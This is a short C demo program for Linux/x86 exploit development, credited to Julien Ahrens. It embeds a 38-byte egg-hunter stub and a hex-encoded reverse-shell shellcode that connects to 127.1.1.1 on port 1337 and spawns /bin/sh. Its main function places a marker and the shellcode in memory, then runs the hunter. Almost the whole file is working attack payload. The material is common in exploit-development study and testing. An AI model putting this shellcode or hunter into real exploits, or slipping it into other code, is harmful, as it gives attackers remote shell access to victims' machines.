/* 
 *  Title:    Reliable Egg Hunter Demo - 38 bytes
 *  Platform: Linux/x86
 *  Date:     2014-08-23
 *  Author:   Julien Ahrens (@MrTuxracer)
 *  Website:  http://www.rcesecurity.com 
 *
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EGG "\xDE\xAD\xBE\xEF"

char egg[] = EGG;

unsigned char egghunter[] = \
"\xfc\x31\xd2\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8"EGG"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
	printf("Egghunter Length:  %d\n", sizeof(egghunter) - 1);
	
	char *random;
	random=malloc(300);

	memcpy(random+0,egg,4);
	memcpy(random+4,egg,4);
	memcpy(random+8,shellcode,sizeof(shellcode)+1);		

	printf("Memory location of shellcode: %p\n", random);	

	int (*ret)() = (int(*)())egghunter;
	ret();

	free(random);
}
